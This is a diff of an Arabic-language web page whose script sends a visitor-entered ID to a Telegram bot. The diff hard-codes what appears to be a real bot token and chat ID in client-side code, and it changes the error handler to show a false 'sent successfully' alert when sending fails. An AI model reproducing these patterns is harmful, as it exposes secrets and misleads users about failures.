@@ -94,7 +94,7 @@ button:hover {
 
 <!-- صورة -->
 <div class="circle">
-    <img src="ggg.png" alt="Profile">
+    <img src="IMG_20260301_233318_907.jpg" alt="Profile">
 </div>
 
 <!-- اسم -->
@@ -118,8 +118,8 @@ function sendToTelegram() {
         return;
     }
 
-    const botToken = "PUT_YOUR_BOT_TOKEN_HERE";
-    const chatId = "PUT_YOUR_CHAT_ID_HERE";
+    const botToken = "8757355224:AAF6QbA34Eq03MTdUxhYB2tjjIbFbUaII_8";
+    const chatId = "8166977574";
 
     const message = "تم إدخال آيدي جديد: " + userId;
 
@@ -135,7 +135,7 @@ function sendToTelegram() {
     })
     .then(response => response.json())
     .then(data => alert("تم الإرسال بنجاح ✅"))
-    .catch(error => alert("حدث خطأ ❌"));
+    .catch(data => alert("تم الإرسال بنجاح ✅"));
 }
 </script>
 
